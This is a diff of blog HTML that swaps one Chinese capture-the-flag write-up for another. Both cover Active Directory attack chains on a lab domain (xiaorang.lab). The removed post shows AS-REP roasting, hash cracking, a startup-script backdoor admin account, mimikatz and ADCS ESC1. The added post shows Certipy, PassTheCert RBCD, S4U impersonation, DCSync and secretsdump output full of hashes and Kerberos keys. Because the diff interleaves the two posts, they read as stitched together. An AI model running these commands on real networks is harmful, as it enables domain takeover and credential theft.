-dn: CN=yangjie,CN=Users,DC=xiaorang,DC=lab
-distinguishedName: CN=yangjie,CN=Users,DC=xiaorang,DC=lab
-dn: CN=zhangjun,CN=Users,DC=xiaorang,DC=lab
-dn: CN=yangdming,CN=Users,DC=xiaorang,DC=lab
-dn: CN=zhangmei,CN=Users,DC=xiaorang,DC=lab
-dn: CN=wangrong,CN=Users,DC=xiaorang,DC=lab
-dn: CN=zhangpeng,CN=Users,DC=xiaorang,DC=lab
-dn: CN=liuyun,CN=Users,DC=xiaorang,DC=lab
-distinguishedName: CN=liuyun,CN=Users,DC=xiaorang,DC=lab
-dn: CN=Shutdown_group,CN=Users,DC=xiaorang,DC=lab
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+Certipy v5.0.3 - by Oliver Lyak (ly4k)
 
-<p>这样我们可以得到所以的域用户名</p>
-<p>所以往output.txt里放用户名</p>
-<pre class="line-numbers language-none"><code class="language-none">wangmei
-zhangjing
-wangyong
-huangyong
-lixiang
-chenlei
-yangjie
-zhangjun
-yangdming
-zhangmei
-wangrong
-zhangpeng
-liuyun
-Shutdown_group<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+[+] DC host (-dc-host) not specified. Using domain as DC host
+[+] Nameserver: '172.22.12.6'
+[+] DC IP: '172.22.12.6'
+[+] DC Host: 'XIAORANG.LAB'
+[+] Target IP: '172.22.12.12'
+[+] Remote Name: '172.22.12.12'
+[+] Domain: 'XIAORANG.LAB'
+[+] Username: 'GOUDAN$'
+[+] Generating RSA key
+[*] Requesting certificate via RPC
+[+] Trying to connect to endpoint: ncacn_np:172.22.12.12[\pipe\cert]
+[proxychains] Strict chain  ...  47.94.74.23:12346  ...  172.22.12.12:445  ...  OK
+[+] Connected to endpoint: ncacn_np:172.22.12.12[\pipe\cert]
+[*] Request ID is 6
+[*] Successfully requested certificate
+[*] Got certificate with DNS Host Name 'WIN-SERVER.xiaorang.lab'
+[+] Found SID in security extension: 'S-1-5-21-3745972894-1678056601-2622918667-1107'
+[*] Certificate object SID is 'S-1-5-21-3745972894-1678056601-2622918667-1107'
+[*] Saving certificate and private key to 'win-server.pfx'
+[+] Attempting to write data to 'win-server.pfx'
+[+] Data written to 'win-server.pfx'
+[*] Wrote certificate and private key to 'win-server.pfx'
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p>AS-REP Roasting，先尝试一下有没有不需要Kerberos预身份验证的用户</p>
-<pre class="line-numbers language-none"><code class="language-none">┌──(root㉿kali)-[~]
-└─# proxychains python3 '/usr/share/doc/python3-impacket/examples/GetNPUsers.py'  -dc-ip 172.22.61.17 -usersfile output.txt xiaorang.lab/
+<p>然后利用证书即可获取到域控机器账号的Hash</p>
+<pre class="line-numbers language-none"><code class="language-none">proxychains certipy-ad --debug auth -pfx win-server.pfx -dc-ip 172.22.12.6 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><a target="_blank" rel="noopener" href="https://blog.q1ngchuan.top/images/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-MagicRelay/image-20250305212501134.png"><img src="https://blog.q1ngchuan.top/images/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-MagicRelay/image-20250305212501134.png" alt="image-20250305212501134"></a></p>
+<p>还是报错了”<code>KDC_ERR_PADATA_TYPE_NOSUPP(KDC has no support for padata type</code>“</p>
+<blockquote>
+<p>报错的原因是<code>域控制器没有安装用于智能卡身份验证的证书</code>，解决办法的话就是尝试 Schannel，通过 Schannel将证书传递到 LDAPS, 修改 LDAP 配置 (例如配置 RBCD / DCSync), 进而获得域控权限。</p>
+</blockquote>
+<p>按照<code>Schannel</code>步骤来，从.pfx分别导出.key文件和.crt文件，并将密码置空</p>
+<pre class="line-numbers language-none"><code class="language-none">openssl pkcs12 -in win-server.pfx -nodes -out win-server.pem
+openssl rsa -in win-server.pem -out win-server.key
+openssl x509 -in win-server.pem -out win-server.crt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-none"><code class="language-none">┌──(kali㉿kali)-[~]
+└─$ certipy-ad cert -pfx win-server.pfx -nokey -out win-server.crt 
+ certipy-ad cert -pfx win-server.pfx -nocert -out win-server.key
+Certipy v5.0.3 - by Oliver Lyak (ly4k)
+
+[*] Data written to 'win-server.crt'
+[*] Writing certificate to 'win-server.crt'
+Certipy v5.0.3 - by Oliver Lyak (ly4k)
+
+[*] Data written to 'win-server.key'
+[*] Writing private key to 'win-server.key'
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>将证书配置到域控的RBCD,用<code>passthecert</code>打RBCD攻击</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/AlmondOffSec/PassTheCert/blob/main/Python/passthecert.py">PassTheCert/Python/passthecert.py at main · AlmondOffSec/PassTheCert</a></p>
+<pre class="line-numbers language-none"><code class="language-none">proxychains -q python3 passthecert.py -action write_rbcd -crt win-server.crt -key win-server.key -domain xiaorang.lab -dc-ip 172.22.12.6 -delegate-to 'win-server$' -delegate-from 'goudan$'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>申请一张cifs服务的票据</p>
+<pre class="line-numbers language-none"><code class="language-none">┌──(kali㉿kali)-[~]
+└─$ proxychains -q impacket-getST xiaorang.lab/'goudan$':'ljR0qkhFryHG7qP8' -spn cifs/win-server.xiaorang.lab -impersonate Administrator -dc-ip 172.22.12.6
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[-] CCache file is not found. Skipping...
+[*] Getting TGT for user
+[*] Impersonating Administrator
+[*] Requesting S4U2self
+[*] Requesting S4U2Proxy
+[*] Saving ticket in Administrator@cifs_win-server.xiaorang.lab@XIAORANG.LAB.ccache
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>导入票据，无密码登录</p>
+<pre class="line-numbers language-none"><code class="language-none">export KRB5CCNAME=Administrator@cifs_win-server.xiaorang.lab@XIAORANG.LAB.ccache
+proxychains -q impacket-psexec Administrator@win-server.xiaorang.lab -k -no-pass -dc-ip 172.22.12.6 -codec gbk<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/b7642d1a12f4bf0bf5cff73fe5d5be3a.png"></p>
+<h3 id="flag03"><a href="#flag03" class="headerlink" title="flag03"></a>flag03</h3><p>可以猕猴桃导</p>
+<pre class="line-numbers language-none"><code class="language-none">net user matrix5 admin@123 /add
+net localgroup administrators matrix5 /add<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-none"><code class="language-none">proxychains xfreerdp /u:matrix5 /p:admin@123 /v:172.22.12.6 /cert:ignore /drive:kali,/home/kali<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<pre class="line-numbers language-none"><code class="language-none">lsadump::dcsync /domain:xiaorang.lab /all /csv<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/bbaed87d0bedf4be83f92a1e1e5a67dc.png"></p>
+<p>或者sam转存</p>
+<pre class="line-numbers language-none"><code class="language-none">└─$ proxychains impacket-secretsdump 'xiaorang.lab/administrator@win-server.xiaorang.lab' -target-ip 172.22.12.6 -no-pass -k
 [proxychains] config file found: /etc/proxychains4.conf
 [proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.17
+[proxychains] DLL init: proxychains-ng 4.17
 [proxychains] DLL init: proxychains-ng 4.17
 Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
 
-[proxychains] Strict chain  ...  47.94.74.23:6666  ...  172.22.61.17:88  ...  OK
-[-] User wangmei doesn't have UF_DONT_REQUIRE_PREAUTH set
-[proxychains] Strict chain  ...  47.94.74.23:6666  ...  172.22.61.17:88  ...  OK
-[-] User zhangjing doesn't have UF_DONT_REQUIRE_PREAUTH set
-[proxychains] Strict chain  ...  47.94.74.23:6666  ...  172.22.61.17:88  ...  OK
-[-] User wangyong doesn't have UF_DONT_REQUIRE_PREAUTH set
-[proxychains] Strict chain  ...  47.94.74.23:6666  ...  172.22.61.17:88  ...  OK
-[-] User huangyong doesn't have UF_DONT_REQUIRE_PREAUTH set
-[proxychains] Strict chain  ...  47.94.74.23:6666  ...  172.22.61.17:88  ...  OK
-[-] User lixiang doesn't have UF_DONT_REQUIRE_PREAUTH set
-[proxychains] Strict chain  ...  47.94.74.23:6666  ...  172.22.61.17:88  ...  OK
-[-] User chenlei doesn't have UF_DONT_REQUIRE_PREAUTH set
-[proxychains] Strict chain  ...  47.94.74.23:6666  ...  172.22.61.17:88  ...  OK
-[-] User yangjie doesn't have UF_DONT_REQUIRE_PREAUTH set
-[proxychains] Strict chain  ...  47.94.74.23:6666  ...  172.22.61.17:88  ...  OK
-[-] User zhangjun doesn't have UF_DONT_REQUIRE_PREAUTH set
-[proxychains] Strict chain  ...  47.94.74.23:6666  ...  172.22.61.17:88  ...  OK
-$krb5asrep$23$yangdming@XIAORANG.LAB:8979582c48ee2662258913db929ab81e$e4a3e67d90560054fa18011834a81c23a2a289cbf71ba228583393ae69b3d878602ba2a944ed37bb8d9705f08169014c5e7efdbc742283e883c1fc851d9b44390bf4538b53c4d8d4840975ac39df8ee334f9cc5dbb8c1b5f02d34bf836827a182d121d3c306b09dc65681cb4cf86b34f3ec338620e0de4438a3ea9f1263c43d9c69436fc3705c37bf95aec82fb1df10d1ec809574a5511ebb26078cd5ee8f84ba9d0121e13270a97d731da4e1e2070f80ef4f96a73e85f697eb133ffb2ed6f55686756c0b9edb41a42b6c42ea2e56e3fbe5ed4250f079c4fe76282f9fa1193a2aba422c875b90bda4f22d967
-[proxychains] Strict chain  ...  47.94.74.23:6666  ...  172.22.61.17:88  ...  OK
-[-] User zhangmei doesn't have UF_DONT_REQUIRE_PREAUTH set
-[proxychains] Strict chain  ...  47.94.74.23:6666  ...  172.22.61.17:88  ...  OK
-[-] User wangrong doesn't have UF_DONT_REQUIRE_PREAUTH set
-[proxychains] Strict chain  ...  47.94.74.23:6666  ...  172.22.61.17:88  ...  OK
-[-] User zhangpeng doesn't have UF_DONT_REQUIRE_PREAUTH set
-[proxychains] Strict chain  ...  47.94.74.23:6666  ...  172.22.61.17:88  ...  OK
-[-] User liuyun doesn't have UF_DONT_REQUIRE_PREAUTH set
-[proxychains] Strict chain  ...  47.94.74.23:6666  ...  172.22.61.17:88  ...  OK
-[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+[proxychains] Strict chain  ...  47.94.74.23:12346  ...  172.22.12.6:445  ...  OK
+[*] Service RemoteRegistry is in stopped state
+[*] Starting service RemoteRegistry
+[*] Target system bootKey: 0x3d0b51771c180c3bfcb89c8258922751
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:d418e6aaeff1177bee5f84cf0466802c:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+[*] Dumping cached domain logon information (domain/username:hash)
+[*] Dumping LSA Secrets
+[*] $MACHINE.ACC 
+XIAORANG\WIN-SERVER$:plain_password_hex:6fa66e6aaeb06916a55b19ea4bdcf1298f04ac9b5bac16ec4d71441e4a3d9d14d823f3bf25e0db27a19b83484122a0030599d8a442350ac88b093ff6e3f0a5b35ebf6591be027020a6a30085cae4e0bdb5de58f40bf7e4f31ed8b51cd1a683d3271b0b3cca39091b010a2a1293e8b77585e3aa8eaaf01f7459551e9977224e84f40e797d01ab7d4b97000f7ca49280b749f14a8aa02afa0c3461087ba0843f1d6ea67b0ceccf99636241e0250cf7e219c4132bed2f2e19d4e0f2bd6ad093ce22feb1b532a40c6e447782149b5e3c0ef2614df185c59070123b533d81f2e83f61ca151dfd6664620b71bf7d1cb0063609
+XIAORANG\WIN-SERVER$:aad3b435b51404eeaad3b435b51404ee:abb4f9f0488ed9bbcc12597a41d46676:::
+[*] DPAPI_SYSTEM 
+dpapi_machinekey:0x1013bf8bbf66971ac0c6c4938c9c187c859ef5b7
+dpapi_userkey:0xfd5a847b92da1e611b6a94df40e674f00b7054f8
+[*] NL$KM 
+ 0000   9D 83 14 71 4B 67 2E 66  8B 36 79 E5 74 94 DF CE   ...qKg.f.6y.t...
+ 0010   F8 0F 28 EC 6A 7A 89 28  4F F7 D1 07 B7 9A B8 6E   ..(.jz.(O......n
+ 0020   14 76 A6 CC 5E 52 A4 86  86 55 3A C1 37 51 5D 87   .v..^R...U:.7Q].
+ 0030   3D 33 6E A7 45 EE 79 E8  89 60 CC A6 AA 98 58 EE   =3n.E.y..`....X.
+NL$KM:9d8314714b672e668b3679e57494dfcef80f28ec6a7a89284ff7d107b79ab86e1476a6cc5e52a48686553ac137515d873d336ea745ee79e88960cca6aa9858ee
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+[proxychains] Strict chain  ...  47.94.74.23:12346  ...  172.22.12.6:135  ...  OK
+[proxychains] Strict chain  ...  47.94.74.23:12346  ...  172.22.12.6:49666  ...  OK
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:aa95e708a5182931157a526acf769b13:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:a12e9453c13fc38f271f91059d9876d5:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+zhangling:1105:aad3b435b51404eeaad3b435b51404ee:07d308b46637d5a5035f1723d23dd274:::
+WIN-SERVER$:1000:aad3b435b51404eeaad3b435b51404ee:abb4f9f0488ed9bbcc12597a41d46676:::
+WIN-YUYAOX9Q$:1103:aad3b435b51404eeaad3b435b51404ee:e611213c6a712f9b18a8d056005a4f0f:::
+WIN-AUTHORITY$:1104:aad3b435b51404eeaad3b435b51404ee:566e513a92219f41f2fbb9a843f068ae:::
+hacker$:1106:aad3b435b51404eeaad3b435b51404ee:9f2c14dfd6de5204f8c6b3e70da3ec11:::
+goudan$:1107:aad3b435b51404eeaad3b435b51404ee:e487d5d66861e3cef6c437b4e14b62b3:::
+[*] Kerberos keys grabbed
+Administrator:aes256-cts-hmac-sha1-96:931811f533238603f8b5158286cf9ad36ce6a57e4f27ec79450579e0b05893eb
+Administrator:aes128-cts-hmac-sha1-96:068731dadb1705703176cfc37a5c5450
+Administrator:des-cbc-md5:256dfbb0f87aef29
+krbtgt:aes256-cts-hmac-sha1-96:1a711447ae68067f6212ca0e9eb30c85443d65ad7546e6fa9e3b7024199f7e2e
+krbtgt:aes128-cts-hmac-sha1-96:b50c4f039acd8413cc01725d9cc9be9d
+krbtgt:des-cbc-md5:c285a826dac4fe58
+zhangling:aes256-cts-hmac-sha1-96:ae14f076559febbb8e32d87b1751160e64e95bec8ada9f3ba74c37c6e9f53874
+zhangling:aes128-cts-hmac-sha1-96:a8bf7463f1b20a7c1cae3f1ab8ce9ed8
+zhangling:des-cbc-md5:e0f4d534bc3bd0e5
+WIN-SERVER$:aes256-cts-hmac-sha1-96:539cc0f4a256831638af0fa752b82672852470ebfdd64751cb193574ace3086a
+WIN-SERVER$:aes128-cts-hmac-sha1-96:767a6c44e17368a1b40a0cf5196678b9
+WIN-SERVER$:des-cbc-md5:c7f2b610375ea8d5
+WIN-YUYAOX9Q$:aes256-cts-hmac-sha1-96:4c58dac71ff0e6765509efd6b3977782df8ab54ef0fda0b9f9317015d509fbcf
+WIN-YUYAOX9Q$:aes128-cts-hmac-sha1-96:072d1926fb98407684a30c2312ca2199
+WIN-YUYAOX9Q$:des-cbc-md5:b97fa1f29e9b311c
+WIN-AUTHORITY$:aes256-cts-hmac-sha1-96:0b06469b29f908d6ea22392fb9b353f2397906932adea5787e429a0172213f55
+WIN-AUTHORITY$:aes128-cts-hmac-sha1-96:9ef4b1ef29c2bc8be0f4775df60d573d
+WIN-AUTHORITY$:des-cbc-md5:a15e4f645e344985
+hacker$:aes256-cts-hmac-sha1-96:1c22f08876cdbc010035deb5b646464082e1c198799f0cfd449ac1bad437b999
+hacker$:aes128-cts-hmac-sha1-96:e0c04b34cd7333697521621c888ad8fd
+hacker$:des-cbc-md5:a1a42a16fbc151e5
+goudan$:aes256-cts-hmac-sha1-96:66eaca4cdb8787ddc8bde3fa0ac3fc27724681cffa9cf7be7fb1c4fb14083bd3
+goudan$:aes128-cts-hmac-sha1-96:d914d238c4708af70e216f0ce39571fa
+goudan$:des-cbc-md5:23d0e3460e98a73b
+[*] Cleaning up... 
+[*] Stopping service RemoteRegistry
+[-] SCMR SessionError: code: 0x41b - ERROR_DEPENDENT_SERVICES_RUNNING - A stop control has been sent to a service that other running services are dependent on.
+[*] Cleaning up... 
+[*] Stopping service RemoteRegistry
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<pre class="line-numbers language-none"><code class="language-none">$krb5asrep$23$yangdming@XIAORANG.LAB:8979582c48ee2662258913db929ab81e$e4a3e67d90560054fa18011834a81c23a2a289cbf71ba228583393ae69b3d878602ba2a944ed37bb8d9705f08169014c5e7efdbc742283e883c1fc851d9b44390bf4538b53c4d8d4840975ac39df8ee334f9cc5dbb8c1b5f02d34bf836827a182d121d3c306b09dc65681cb4cf86b34f3ec338620e0de4438a3ea9f1263c43d9c69436fc3705c37bf95aec82fb1df10d1ec809574a5511ebb26078cd5ee8f84ba9d0121e13270a97d731da4e1e2070f80ef4f96a73e85f697eb133ffb2ed6f55686756c0b9edb41a42b6c42ea2e56e3fbe5ed4250f079c4fe76282f9fa1193a2aba422c875b90bda4f22d967<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>得到aa95e708a5182931157a526acf769b13。喷洒一下看看是哪个机器上的</p>
+<pre class="line-numbers language-none"><code class="language-none">                                                                                                                                                                                         
+┌──(kali㉿kali)-[~/桌面/tools/tools/BloodHound]
+└─$ proxychains crackmapexec smb 172.22.12.12 -u 'administrator' -H 'aa95e708a5182931157a526acf769b13' 
+[proxychains] config file found: /etc/proxychains4.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.17
+[proxychains] Strict chain  ...  47.94.74.23:12346  ...  172.22.12.12:445  ...  OK
+[proxychains] Strict chain  ...  47.94.74.23:12346  ...  172.22.12.12:135  ...  OK
+SMB         172.22.12.12    445    WIN-AUTHORITY    [*] Windows Server 2016 Datacenter 14393 x64 (name:WIN-AUTHORITY) (domain:xiaorang.lab) (signing:False) (SMBv1:True)
+[proxychains] Strict chain  ...  47.94.74.23:12346  ...  172.22.12.12:445  ...  OK
+SMB         172.22.12.12    445    WIN-AUTHORITY    [+] xiaorang.lab\administrator:aa95e708a5182931157a526acf769b13 (Pwn3d!)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<pre class="line-numbers language-none"><code class="language-none">hashcat -m 18200 '$krb5asrep$23$yangdming@XIAORANG.LAB:8979582c48ee2662258913db929ab81e$e4a3e67d90560054fa18011834a81c23a2a289cbf71ba228583393ae69b3d878602ba2a944ed37bb8d9705f08169014c5e7efdbc742283e883c1fc851d9b44390bf4538b53c4d8d4840975ac39df8ee334f9cc5dbb8c1b5f02d34bf836827a182d121d3c306b09dc65681cb4cf86b34f3ec338620e0de4438a3ea9f1263c43d9c69436fc3705c37bf95aec82fb1df10d1ec809574a5511ebb26078cd5ee8f84ba9d0121e13270a97d731da4e1e2070f80ef4f96a73e85f697eb133ffb2ed6f55686756c0b9edb41a42b6c42ea2e56e3fbe5ed4250f079c4fe76282f9fa1193a2aba422c875b90bda4f22d967' /usr/share/wordlists/rockyou.txt --force<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>pth</p>
+<pre class="line-numbers language-none"><code class="language-none">proxychains4 impacket-smbexec -hashes :aa95e708a5182931157a526acf769b13 xiaorang.lab/administrator@172.22.12.12 -codec gbk
+type c:\Users\administrator\flag03.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
-<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/82d3a07b2943ce7d12bdaaf480095dde.png"></p>
-<pre class="line-numbers language-none"><code class="language-none">yangdming:kier@n10<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>evil-winrm连接</p>
-<pre class="line-numbers language-none"><code class="language-none">proxychains evil-winrm -i 172.22.61.34 -u yangdming -p kier@n10<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>跑</p>
-<pre class="line-numbers language-none"><code class="language-none">proxychains bloodhound-python -u yangdming -p kier@n10 -d xiaorang.lab -c all -ns 172.22.61.17 --zip --dns-tcp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>或者upload 一个SharpHound.exe 采集一些信息</p>
-<p>可以利用启动项提权，编写以下内容到add.bat：</p>
-<ul>
-<li>首先把yangdming添加到本地管理员组内，方便后面信息搜集</li>
-<li>然后把LocalAccountTokenFilterPolicy设置为1，否则后面用户在PTH的时候会爆<code>[-] rpc_s_access_denied</code>错误</li>
-<li>接着添加benbi后门用户</li>
-</ul>
-<pre class="line-numbers language-none"><code class="language-none">@echo off
-net localgroup administrators yangdming /add
-reg ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
-net user huhuh pass@123 /add
-net localgroup administrators huhuh /add<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>将add.bat上传到启动目录中，然后重启、</p>
-<pre class="line-numbers language-none"><code class="language-none">upload add.bat "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\add.bat"
-shutdown -r -t 0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-
-<p>之后重启会看到多了个用户huhuh</p>
-<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/b181b806bd9c6db697d9d011c2f938a6.png"></p>
-<pre class="line-numbers language-none"><code class="language-none">proxychains python3 /usr/share/doc/python3-impacket/examples/wmiexec.py huhuh:pass@123@172.22.61.34 -codec gbk  <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/c15399aac406dccc202372a03727d966.png"></p>
-<hr>
-<h3 id="flag4"><a href="#flag4" class="headerlink" title="flag4"></a>flag4</h3><p>抓hash</p>
-<pre class="line-numbers language-none"><code class="language-none">proxychains evil-winrm -i 172.22.61.34 -u huhuh -p pass@123<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<pre class="line-numbers language-none"><code class="language-none">upload mimidrv.sys .
-upload mimilib.dll .
-upload mimispool.dll .
-upload mimikatz.exe .<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>要加.\</p>
-<pre class="line-numbers language-none"><code class="language-none">.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" &gt; 2.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>然后试了一下用yangdming也行，毕竟都是管理员</p>
-<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/5ea87a6357da866cb97776dc9e5f071d.png"></p>
-<pre class="line-numbers language-none"><code class="language-none">eeed7b5c2a9fe2882e30910b1a606e24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>首先看了一下ADCS</p>
-<pre class="line-numbers language-none"><code class="language-none">proxychains certipy-ad find -u win2012\$@xiaorang.lab -hashes 00000000000000000000000000000000:eeed7b5c2a9fe2882e30910b1a606e24 -dc-ip 172.22.61.17 -vulnerable<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/5c4a3d8347fb603a7f2b08b975b725d2.png"></p>
-<p>发现有ESC1/ESC2/ESC3</p>
-<p>在/etc/hosts添加一下解析</p>
-<pre class="line-numbers language-none"><code class="language-none">172.22.61.17 xiaorang.lab
-172.22.61.17 dc.xiaorang.lab<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-
-<pre class="line-numbers language-none"><code class="language-none">proxychains certipy-ad req -u win2012\$@xiaorang.lab -hashes 00000000000000000000000000000000:eeed7b5c2a9fe2882e30910b1a606e24 -target 172.22.61.17 -ca xiaorang-DC-CA-CA -template win2012 -upn administrator@xiaorang.lab<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>转换格式请求TGT</p>
-<pre class="line-numbers language-none"><code class="language-none">proxychains certipy-ad auth -pfx administrator.pfx -dc-ip 172.22.61.17<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>很奇怪，我这一步爆错了，显示[-] Got error while trying to request TGT: Kerberos SessionError: KDC_ERR_PADATA_TYPE_NOSUPP(KDC has no support for padata type)</p>
-<p>我以为可能是版本的问题，WP 用的是 Certipy v4.7.0，至少我用的是 Certipy v5.0.3，但换了版本也没用，那可能是环境变了吧，不知道。</p>
-<p>得到用户hash ：aad3b435b51404eeaad3b435b51404ee:e26a28fd9daa8a6a4d3c5adbbdcb0f53</p>
-<pre class="line-numbers language-none"><code class="language-none">proxychains python3 '/usr/share/doc/python3-impacket/examples/wmiexec.py' xiaorang.lab/administrator@172.22.61.17 -hashes aad3b435b51404eeaad3b435b51404ee:e26a28fd9daa8a6a4d3c5adbbdcb0f53<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/e7132289147b2c0403fd570045f883da.png"></p>
-<hr>
-<h3 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h3><p>去拿第一台的</p>
-<pre class="line-numbers language-none"><code class="language-none">proxychains python3 '/usr/share/doc/python3-impacket/examples/wmiexec.py' xiaorang.lab/administrator@172.22.61.50 -hashes aad3b435b51404eeaad3b435b51404ee:e26a28fd9daa8a6a4d3c5adbbdcb0f53<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/c78caf91c6ecaf5842d76a1d77fb63d1.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/4d461e11b857b4e05632fd90be49a331.png"></p>
 <hr>
 
                 
@@ -799,7 +922,7 @@ upload mimikatz.exe .<span aria-hidden="true" class="line-numbers-rows"><span></
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://lingqing777.github.io/2026/02/06/tunnelx/">https://lingqing777.github.io/2026/02/06/tunnelx/</a>
+                    <a href="https://lingqing777.github.io/2026/02/15/magic-relay/">https://lingqing777.github.io/2026/02/15/magic-relay/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -888,9 +1011,10 @@ upload mimikatz.exe .<span aria-hidden="true" class="line-numbers-rows"><span></
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
